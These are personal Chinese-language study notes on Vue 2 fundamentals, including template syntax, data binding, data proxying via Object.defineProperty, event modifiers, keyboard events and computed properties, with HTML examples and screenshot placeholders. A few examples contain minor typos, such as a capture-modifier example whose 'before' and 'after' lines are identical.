# Vue笔记



## 1 .vue入门

### 1.1 官网

```sh
# 英文官网
https://vuejs.org/

# 中文官网
https://cn.vuejs.org/

# 相关API查阅
https://developer.mozilla.org/zh-CN
```

**介绍与描述**

动态构建用户界面的渐进式javascript框架。

作者：尤雨溪

**Vue特点**

遵循MVVM模式

编码简洁，体积小，运行效率高，适合移动/PC端开发。

它本身只关注UI，也可以引入其他第三方库开发项目。



**环境安装**

```sh
Visual Studio Code
需要安装插件live server
# 浏览器安装插件
vue_dev_tools.crx

# 安装VS插件 Vetur (Pine Wu)
```



### 1.2 VUE的hello-word

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>初识VUE</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h1>Hello,nullnull</h1>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false
    </script>
</body>
</html>
```



打开live server

![image-20241224123728450](.\images\image-20241224123728450.png)



### 1.3 模板语法

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-模板语法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h1>插件语法</h1>
        <h3>你好: {{name}}</h3>
        <hr/>
        <h1>指令语法</h1>
        <a v-bind:href="employee.url" attribute="你好">点击去{{employee.name}}1</a>
        <a :href="employee.url" :attribute="employee.attribute">点击去{{employee.name}}2</a>
    </div>
    <script type="text/javascript">
        //阻止VUE在启动时生产警告信息
        Vue.config.productionTip = false
        new Vue({
            el:'#root',
            data: {
                name:'nullnull',
                employee: {
                    name: '百度',
                    url: 'https://www.baidu.com',
                    attribute: '属性'
                }
            }
        }
        );
    </script>
</body>
</html>
```

打开live server

打开浏览器显示：

![image-20241224125246351](.\images\image-20241224125246351.png)

查看见面源代码：

```html

<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-模板语法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h1>插件语法</h1>
        <h3>你好: {{name}}</h3>
        <hr/>
        <h1>指令语法</h1>
        <a v-bind:href="employee.url" attribute="你好">点击去{{employee.name}}1</a>
        <a :href="employee.url" :attribute="employee.attribute">点击去{{employee.name}}2</a>
    </div>
    <script type="text/javascript">
        //阻止VUE在启动时生产警告信息
        Vue.config.productionTip = false
        new Vue({
            el:'#root',
            data: {
                name:'nullnull',
                employee: {
                    name: '百度',
                    url: 'https://www.baidu.com',
                    attribute: '属性'
                }
            }
        }
        );
    </script>
<!-- Code injected by live-server -->
<script>
	// <![CDATA[  <-- For SVG support
	if ('WebSocket' in window) {
		(function () {
			function refreshCSS() {
				var sheets = [].slice.call(document.getElementsByTagName("link"));
				var head = document.getElementsByTagName("head")[0];
				for (var i = 0; i < sheets.length; ++i) {
					var elem = sheets[i];
					var parent = elem.parentElement || head;
					parent.removeChild(elem);
					var rel = elem.rel;
					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
					}
					parent.appendChild(elem);
				}
			}
			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
			var address = protocol + window.location.host + window.location.pathname + '/ws';
			var socket = new WebSocket(address);
			socket.onmessage = function (msg) {
				if (msg.data == 'reload') window.location.reload();
				else if (msg.data == 'refreshcss') refreshCSS();
			};
			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
				console.log('Live reload enabled.');
				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
			}
		})();
	}
	else {
		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
	}
	// ]]>
</script>
</body>
</html>
```

总结：

VUE的模板语法有两大类：

> 1. 插值语法
>
>    功能：用于解析标签体内容。
>
>    写法： {{xxx}} ,xxx是js表达式，且可以直接读取到data中的所有属性
>
> 2. 指令语法
>
>    功能：用于解析标签（包括标签属性、标签内容、绑定事件......）
>
>    例如：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式，且可以直接读取到data中的所有属性。				 
>
>    备注：Vue中有很多的指令，且形式都是v-xxx



### 1.4 数据绑定

源码：

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-数据绑定</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <!-- 单向数据绑定 -->
        单向数据绑定:<input type="text" v-bind:value="name"/><br/>
        <!-- 双向数据绑定 -->
        双向数据绑定:<input type="text" v-model:value="name"/>

    </div>
    <script type="text/javascript">
        //阻止VUE在启动时生产警告信息
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data:{
                name: 'nullnull'
            }
        });
    </script>
</body>
</html>
```

打开live server

网页: http://127.0.0.1:5500/03-databind/vue-03-databind.html

![image-20241225121605792](.\images\image-20241225121605792.png)

在单个绑定的输入框中输入字符，其他数据并不会随着输入变化，而当在双向绑定的框中输入，VUE中信息会跟着变化，而由于单向绑定的框是读取的数据，也会连锁跟着变化。



![image-20241225121736505](.\images\image-20241225121736505.png)

还可以使用简写形式：

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-数据绑定</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <!-- 单向数据绑定 -->
        <!-- 单向数据绑定:<input type="text" v-bind:value="name"/><br/> -->
        <!-- 双向数据绑定 -->
        <!-- 双向数据绑定:<input type="text" v-model:value="name"/>  -->

        <!-- 简写 -->
        <!-- 单向数据绑定 -->
        单向数据绑定:<input type="text" :value="name"/><br/>
        <!-- 双向数据绑定 -->
        双向数据绑定:<input type="text" v-model="name"/>

    </div>
    <script type="text/javascript">
        //阻止VUE在启动时生产警告信息
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data:{
                name: 'nullnull'
            }
        });
    </script>
</body>
</html>
```

效果与之前一致。

**总结：**

单向数据绑定：

语法，v-bind:href="xxxx"或者简写:href

特点：数据只能从data流向页面

双向数据绑定：

语法：v-model:value="xxx",简写：v-model="xxx"

特点：数据不仅能从data流向页面，还能从页面流向data.

	备注：
	1.双向绑定一般都应用在表单类元素上（如：input、select等）
	2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。





### 1.4.1 El和Data的两种写法

EL的两种写法，可以理解选择与动态选择。

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-EL和Data的两种写法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <!-- 容器 -->
    <div id="root">
       你好：{{name}}
    </div>
    <script type="text/javascript">
        //阻止VUE在启动时生产警告信息
        Vue.config.productionTip = false
        // el的第一种写法
        // new Vue({
        //     el: '#root',
        //     data:{
        //         name: 'nullnull'
        //     }
        // });
        // el 第二种写法，动态设置
        const v = new Vue({
            // el: '#root',
            data:{
                name: 'nullnull'
            }
        });
        console.log(v)
        v.$mount('#root')

    </script>
</body>
</html>
```

data的两种写法：

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-EL和Data的两种写法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <!-- 容器 -->
    <div id="root">
       你好：{{name}}
    </div>
    <script type="text/javascript">
        //阻止VUE在启动时生产警告信息
        Vue.config.productionTip = false
        // data 的第一种写法
        new Vue({
            el: '#root',
            data:{
                name: 'nullnull'
            }
        });
        //data 第二种写法，方法式，但方法的返回值须为一个对象
        const v = new Vue({
            el: '#root',
            data:function(){
                //此处的this是Vue实例对象
                console.log('----',this) 
                return {
                    name: "nullnull"
                }
            }
        });

    </script>
</body>
</html>
```

总结：

el有两种写法：

1. new Vue时候配制el属性
2. 先创建Vue实例，随后再通过vm.$mount('#root')，指定el的值

data也有两种写法：

1. 对象式。
2. 函数式。

此处两种写法都可以。但到组件时，data必须使用函数式。

重要的原则：

由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数就不再是Vue实例了，而变成了windows了。





### 1.5 MVVM模型

1. M: 模型（Model）对应 data中的数据
2. V：视图（view）模板
3. VM：视图模型（ViewModel):Vue实例对象.

![image-20241225122542893](.\images\image-20241225122542893.png)

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-MVVM模型</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <!-- 容器 -->
    <div id="root">
       <h1>直接写的属性:{{name}}</h1>
       <h2>Vue的自身属性:{{$createElement}}</h2>
       <h3>原型对象属性:{{$nextTick}}</h3>
    </div>
    <script type="text/javascript">
        //阻止VUE在启动时生产警告信息
        Vue.config.productionTip = false
        // data 的第一种写法
        const vm = new Vue({
            el: '#root',
            data:{
                name: 'nullnull'
            }
        });
        console.log(vm);
    </script>
</body>
</html>
```

![image-20241225124905441](.\images\image-20241225124905441.png)

结论：

data中的所有属性，最后都同现在vmt身上

vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。



### 1.5.1 defineProperty回顾



```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-Object.defineproperty方法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <script type="text/javascript">
        let number = 18;
        let person = {
            name:'空空',
            sex: '男'
        };

        
        Object.defineProperty(person,'age',{
            value : 18,
            //控制属性是否可以被枚举(不参与遍历),默认为false，不参数
            enumerable: false,
            //控制䅏是否可以被修改,默认为false，不能被修改
            writable: false,
            //控制属性是否可以被删除，默认值为false，不能被删除
            configurable: false
        });

        //输出属性的key
        console.log(Object.keys(person));
        //输出对象信息
        console.log(person);
    </script>
</body>
</html>
```

观察控制台

![image-20241225230820020](.\images\image-20241225230820020.png)

通过观察即可发现，在没有特别指定的情况下，Object.defineProperty定义的属性不能被遍历到

```html
    <script type="text/javascript">
        let number = 18;
        let person = {
            name:'空空',
            sex: '男'
        };

        
        Object.defineProperty(person,'age',{
            value : 18,
            //控制属性是否可以被枚举(不参与遍历),默认为false，不参数
            enumerable: true,
            //控制䅏是否可以被修改,默认为false，不能被修改
            writable: false,
            //控制属性是否可以被删除，默认值为false，不能被删除
            configurable: false
        });

        //输出属性的key
        console.log(Object.keys(person));
        //输出对象信息
        console.log(person);
    </script>
```

当参数被`enumerable`被打开之后，便可以被遍历到

![image-20241225231821152](.\images\image-20241225231821152.png)

再尝试修改

![image-20241225232403585](.\images\image-20241225232403585.png)

当开关未被打开时，不能被修改

此时打开开关：

```javascript
  Object.defineProperty(person,'age',{
            value : 18,
            //控制属性是否可以被枚举(不参与遍历),默认为false，不参数
            enumerable: true,
            //控制䅏是否可以被修改,默认为false，不能被修改
            writable: true,
            //控制属性是否可以被删除，默认值为false，不能被删除
            configurable: false
        });
```

观察发现，当修改被打开时，数据被成功的修改。

![image-20241225232533074](.\images\image-20241225232533074.png)

最后尝试删除操作，先按默认，参数关闭

![image-20241225232706307](.\images\image-20241225232706307.png)

数据是不能被删除的

此时将开关打开

```javascript
        Object.defineProperty(person,'age',{
            value : 18,
            //控制属性是否可以被枚举(不参与遍历),默认为false，不参数
            enumerable: false,
            //控制䅏是否可以被修改,默认为false，不能被修改
            writable: true,
            //控制属性是否可以被删除，默认值为false，不能被删除
            configurable: true
        });
```

结果：

![image-20241225232823028](.\images\image-20241225232823028.png)



get函数与set函数

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-Object.defineproperty方法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <script type="text/javascript">
        let number = 18;
        let person = {
            name:'空空',
            sex: '男'
        };

        
        Object.defineProperty(person,'age',{
            // value : 18,
            // //控制属性是否可以被枚举(不参与遍历),默认为false，不参数
            // enumerable: false,
            // //控制䅏是否可以被修改,默认为false，不能被修改
            // writable: true,
            // //控制属性是否可以被删除，默认值为false，不能被删除
            // configurable: true

            //当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
            get:function(){
                console.log('有人读取了get属性');
                return number;
            },

            //当有人修改person的age属性时，set函数（setter)就会被调用，且会收到修改的具体值
            set(value){
                console.log('有人修改了age属性,值为:',value);
                number = value;
            }
        });

        //输出属性的key
        console.log(Object.keys(person));
        //输出对象信息
        console.log(person);
    </script>
</body>
</html>
```

测试get函数

![image-20241225233720389](.\images\image-20241225233720389.png)

测试修改后读取

![image-20241225234311819](.\images\image-20241225234311819.png)

### 1.5.2 数据代理

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-数据代理</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <!-- 数据代理：通过一个对象代理另一个对象中属性的操作（读/写） -->
    <script type="text/javascript">
       let obj = {
        x : 100
       };
       let objy = {
        y : 200
       };
       Object.defineProperty(objy,'x',{
        get(){
            return obj.x;
        },
        set(value)
        {
            obj.x = value;
        }
       })
    </script>
</body>
</html>
```

此时验证下，修改objy的x会不会影响obj.x

![image-20241225235156971](.\images\image-20241225235156971.png)

经过验证可以发现，修改objy的x值就会影响obj里面的x，此就是数据代理。



### 1.5.3 Vue中的数据代理

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE中的数据代理</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>姓名：{{name}}</h2>
        <h3>家庭住址：{{address}}</h3>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name:'nullnull',
                address:'上海'
            }
        })
    </script>
</body>
</html>
```

打开控制台，查看Vm的信息可以发现：

![image-20241226124653217](.\images\image-20241226124653217.png)

Vue数据代理

```vue
        const vm = new Vue({
            el: '#root',
            data:{
                name:'nullnull',
                address:'上海'
            }
        })
```

然后VM就会创建一个VM对象

```javascript
VM{
    $attrs: {xxx},
    $children: {xxx}
    ......
   _data: {
       name:'nullnull',
       address:'上海'
   }
        
}
```

那些时，便可以使用_data对象

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE中的数据代理</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>姓名：{{_data.name}}</h2>
        <h3>家庭住址：{{_data.address}}</h3>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name:'nullnull',
                address:'上海'
            }
        })
    </script>
</body>
</html>
```

如果改成这样，那页面也是可以正常的访问到

![image-20241226192222171](.\images\image-20241226192222171.png)

到此时数据已经基本可以访问但是需要加上`_data`前缀，那就太不友好了，Vue帮我做了一件事情，就是将data中的属性都添加到了`Vm`身上，如果要获取name的值，就可以直接用vm的name的get方法，同理设置就可以调用set方法。 此操作的目在的于编码操作的方便。那此数据代理是如何实现的呢，此就是使用了`Object.defineProperty`

总结：

1. Vue中的数据代理：通过vm对象来代理data对象中属性的操作(读/写)

2. Vue中数据代理的好处：更加方便的操作data中的数据

3. 基本原理：通过Object.defineProperty()把data对象中的属性添加到vm上：

   为每一个添加到vm上的属性，都指定一个getter和setter方法。

   在getter和setter内部去操作，（读/写）data对应的属性。



### 1.6.1  事件处理-1

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE中的事件使用</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>你好，欢迎来到{{name}}的世界</h2>
        <button @click="showInfo1">点击提示（不带参数）</button><br/><br/>
        <button @click="showEvent(2,$event)">点击提示（带参数）</button>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name:'Vue21'
            },
            methods:{
                showInfo1(event){
                    console.log(event.target.innerText);
                    console.log('不带参数的',event);
                    console.log(this);
                    alert("不带参数提示");
                },
                showEvent(number,event){
                    console.log(event.target.innerText);
                    console.log('带参数的name',number);
                    console.log('带参数的',event);
                    console.log(this);
                    alert("带参数提示")
                }
            }
        })
    </script>
</body>
</html>
```

首先点击不带参数的

![image-20241226194925382](.\images\image-20241226194925382.png)

再参数控制台：

![image-20241226194955972](.\images\image-20241226194955972.png)

可以发现，当前的不带参数的event对象就是这个点击按钮。当前的this是Vue对象。

再占击带参数的按钮，会得到提示：

![image-20241226195123044](.\images\image-20241226195123044.png)

同时除了正常的参数外，还可以指定参数`$event`

![image-20241226195324469](.\images\image-20241226195324469.png)

事件的基本使用总结：

1. 使用v-onxxx或者@xxx绑定事件，其中xxx 是事件名
2. 事件的回调需要配制methods对象中，最终会在vm上。
3. methods中配制的函数，不要用箭头函数，否则this就不是Vm了，而是windows了
4. methods中配制的函数，都是被Vue所管理的函数，this的指向是vm或者组件实例对象。
5. @click="demo"和@click="$demo($event)"效果一致，但后者可以传参数。

### 1.6.2  事件处理-2

**阻止默认事件**

首先看不阻止默认事件

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE中的事件使用</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <!-- 阻止默认事件 -->
         <a href ="http://www.baidu.com" @click="showInfo">点我跳转</a>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name:'Vue21'
            },
            methods:{
                showInfo(event){
                    console.log(event.target);
                    alert(this);
                }
            }
        })
    </script>
</body>
</html>
```

打开页面：

![image-20241226200119792](.\images\image-20241226200119792.png)

当点击后，就会弹出提示框`[object Object]`，点击之后，便会跳走。

如果要阻止其跳转，可修改为:

```html
<!--将原来的-->
<a href ="http://www.baidu.com" @click="showInfo">点我跳转</a>
<!--改为-->
<a href ="http://www.baidu.com" @click.prevent="showInfo">点我跳转</a>
```

当再次点击点我跳转时仅会弹出提示信息，不会跳转。



**阻止事件冒泡**

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE中的事件使用-2冒泡</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <style>
        .big1 {
            height: 50px;
            background-color: red;
        }
    </style>
</head>
<body>
    <div id="root">
        <!-- 阻止事件冒泡 -->
        <div class="big1" @click="showInfo($event,1)">
            <button @click="showInfo($event,2)">点我触发冒泡</button>
        </div>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name:'Vue21'
            },
            methods:{
                showInfo(event,number){
                    console.log('调用方:',number);
                }
            }
        })
    </script>
</body>
</html>
```

当打开服务：

![image-20241226201430768](.\images\image-20241226201430768.png)

当点击了触发冒泡后，首先还是按钮触发事件，然后就是dev又触发了一次事件，如果要阻止触发，可以修改为：

```html
<button @click="showInfo($event,2)">点我触发冒泡</button>
<!--修改为：-->
<button @click.stop="showInfo($event,2)">点我触发冒泡</button>
```

再次测试：

![image-20241226201650380](.\images\image-20241226201650380.png)

此时事件仅被触发了一次。

**事件只触发一次**

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE事件只触发一次</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
       <!-- <事件只触发一次 -->
        <button @click="showInfo">点我触发事件</button>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name:'Vue21'
            },
            methods:{
                showInfo(event){
                    console.log(event.target);
                    alert(this);
                }
            }
        })
    </script>
</body>
</html>
```

当打开页面打，可以多点点击页面操作

![image-20241226225129730](.\images\image-20241226225129730.png)

针对事件只触发一次的需求，可以这样来实现：

```html
<button @click="showInfo">点我触发事件</button>
改为
<button @click.once="showInfo">点我触发事件</button>
```

这时候无论点击多少次，都只会触发一次事件



**capture事件的捕获模式**

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE中的事件使用-事件的捕获模式</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <style>
        .box1{
				padding: 5px;
				background-color: skyblue;
			}
			.box2{
				padding: 5px;
				background-color: orange;
			}
    </style>
</head>
<body>
    <div id="root">
        <!-- 使用事件的捕获模式 -->
         <div class="box1" @click="showInfo($event,1)">
            div1
            <div class="box2" @click="showInfo($event,2)">
                div2
            </div>
         </div>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name:'Vue21'
            },
            methods:{
                showInfo(event,number){
                    console.log('调用方:',number);
                }
            }
        })
    </script>
</body>
</html>
```

![image-20241226230323199](.\images\image-20241226230323199.png)

事件需要先经过事件的捕获，然后再进行事件的冒泡。事件的捕获阶段是是由外往内，而事件冒泡是由内向外。如果不想在冒泡阶段进行事件的处理，可以这样来处理

```html
<div class="box1" @click="showInfo($event,1)">
<!--改为-->
<div class="box1" @click="showInfo($event,1)">
```

![image-20241226230424028](.\images\image-20241226230424028.png)

**只有event.target是当前操作元素时才触发事件**

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE中的事件使用-event是当前操作无素时才触发</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <style>
        .demo1{
				height: 50px;
				background-color: skyblue;
			}
    </style>

</head>
<body>
    <div id="root">
        <!-- 只有event.target是当前操作元素时才触发 -->
         <div class="demo1" @click="showInfo($event,1)">
           <button @click="showInfo($event,2)">点击触发</button>
         </div>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name:'Vue21'
            },
            methods:{
                showInfo(event,number){
                    console.log('调用方:',number);
                }
            }
        })
    </script>
</body>
</html>
```

点击后的效果

![image-20241226230933768](.\images\image-20241226230933768.png)

当我们不不想让div也触发事件时，就可以指定self

```html
<div class="demo1" @click="showInfo($event,1)">
<!--改为-->
<div class="demo1" @click.self="showInfo($event,1)">
```

这时候再触发时便不会再触发

![image-20241226231253755](.\images\image-20241226231253755.png)





**事件无需等待立即执行**

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE中的事件使用-event是当前操作无素时才触发</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <style>
            .list{
				width: 200px;
				height: 200px;
				background-color: peru;
				overflow: auto;
			}
			li{
				height: 100px;
			}
    </style>

</head>
<body>
    <div id="root">
        <!-- 事件的默认行为立即执行，无需等待事件回调执行完毕 -->
        <!-- 流动有两种：一种是 scroll，wheel -->
        <!-- @scroll="maxTimeMethod"是给滚动条添加的滚动事件,包括键盘的方向键滚动和滚动条的滚动 -->
        <!-- @wheel="maxTimeMethod"是鼠标滚轮的滚动 -->
         <!-- 区别：当使用wheel时，只要滚轮还在滚动，事件就能触发，而 scroll 不能滚动后便不再触发-->
        <!-- <ul @scroll="maxTimeMethod" class="list"> -->
        <ul @wheel="maxTimeMethod" class="list">
            <li>1</li>
            <li>2</li>
            <li>3</li>
            <li>4</li>
        </ul>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name:'Vue21'
            },
            methods:{
                maxTimeMethod(){
                   for(let i =0 ; i<100000;i++)
                    {
                        console.log('#');
                    }
                    console.log('终于执行完了');
                }
            }
        })
    </script>
</body>
</html>
```

当执行滚时，会发现，数据已经在执行了，但是滚动条没有动。

![image-20241226232912074](.\images\image-20241226232912074.png)

可以发现，事件已经在执行了，但是滚动条是没有动的。如果需要优先响应滚动条，可以这样修改

```html
<ul @wheel="maxTimeMethod" class="list">
<!--改为-->
<ul @wheel.passive="maxTimeMethod" class="list">
```

这时候，再打开页面即可观察到，不用再等待滚动条会立即滚动。



总结：

1.prevent：阻止默认事件（常用）；
2.stop：阻止事件冒泡（常用）；
3.once：事件只触发一次（常用）；
4.capture：使用事件的捕获模式；
5.self：只有event.target是当前操作的元素时才触发事件；
6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕



### 1.6.3 键盘事件

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE中的键盘事件使用</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>欢迎来到{{name}}的世界!!!</h2>
        <input type="text" placeholder="按回车提示输入" @keydown.enter="keyEvent($event)" />
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name:'Vue'
            },
            methods:{
                keyEvent(k){
                    console.log('事件',k.key,k.keyCode);
                    console.log(k.target.value);
                }
            }
        })
    </script>
</body>
</html>
```

打开页面输入内容后回车

![image-20241226233907969](.\images\image-20241226233907969.png)

按键的总结：

```html
		<!-- 
				1.Vue中常用的按键别名：
							回车 => enter
							删除 => delete (捕获“删除”和“退格”键)
							退出 => esc
							空格 => space
							换行 => tab (特殊，必须配合keydown去使用)
							上 => up
							下 => down
							左 => left
							右 => right

				2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）

				3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
							(1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
							(2).配合keydown使用：正常触发事件。

				4.也可以使用keyCode去指定具体的按键（不推荐）

				5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
		-->
```



### 1.7 计算属性

#### 1.7.1 插件语法实现

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-插值实现姓名信息</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        姓：<input type="text" v-model="firstName" /> <br/><br/>
        名：<input type="text" v-model="lastName" /> <br/><br/>
        全名: <span>{{firstName}}-{{lastName}}</span>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                firstName:'张',
                lastName:'三'
            }
        })
    </script>
</body>
</html>
```

打开服务:

![image-20241227091945089](.\images\image-20241227091945089.png)

#### 1.7.2 方法实现

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-插值实现姓名信息</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        姓：<input type="text" v-model="firstName" /> <br/><br/>
        名：<input type="text" v-model="lastName" /> <br/><br/>
        全名: <span>{{fullname()}}</span>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                firstName:'张',
                lastName:'三'
            },
            methods:{
                fullname(){
                    console.log('@--fullname');
                    return this.firstName + '-' + this.lastName;
                }
            }
        })
    </script>
</body>
</html>
```

打开网页

![image-20241227223712250](.\images\image-20241227223712250.png)

#### 1.7.3 插值语法

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-姓名信息-计算属性</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        姓：<input type="text" v-model="firstName" /> <br/><br/>
        名：<input type="text" v-model="lastName" /> <br/><br/>
        全名: <span>{{fullName}}</span><br/><br/>
        全名: <span>{{fullName}}</span><br/><br/>
        全名: <span>{{fullName}}</span><br/><br/>
        全名: <span>{{fullName}}</span>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                firstName:'张',
                lastName:'三'
            },
            methods:{
            },
            computed:{
                fullName:{
                    //get的作用：当有人读取fullname时，get会被调用，会返回值就作为fullname的值
                    //get什么时候被调用呢？1，初次读取fullname时，2，所依赖的数据发生变化时
                    //在计算属性中，存在缓存，不是每次都加载
                    get(){
                        console.log('get被调用了');
                        return this.firstName + '-' + this.lastName;
                    },
                    //set什么时候会被调用，当fullName被修改时
                    set(value){
                        console.log('set',value);
                    }
                }
            }
        })
    </script>
</body>
</html>
```

![image-20241227225848386](.\images\image-20241227225848386.png)

计算属性并不是每次都加载最新的值，是有缓存的。

![image-20241227230611378](.\images\image-20241227230611378.png)

当fullname的值被修改时，此set方法就会被调用。

此时对set方法进行设置

```html
set(value){
    console.log('set',value);
    const arr = value.split('-');
    this.firstName = arr[0];
    this.lastName = arr[1];
}
```

此时打开页面，再进行设置操作

![image-20241227231344195](.\images\image-20241227231344195.png)

观察Vue对象

![image-20241227231440272](.\images\image-20241227231440272.png)

总结：

计算属性：

​				1.定义：要用的属性不存在，要通过已有属性计算得来。
​				2.原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
​				3.get函数什么时候执行？
​							(1).初次读取时会执行一次。
​							(2).当依赖的数据发生改变时会被再次调用。
​				4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
​				5.备注：
​						1.计算属性最终会出现在vm上，直接读取使用即可。
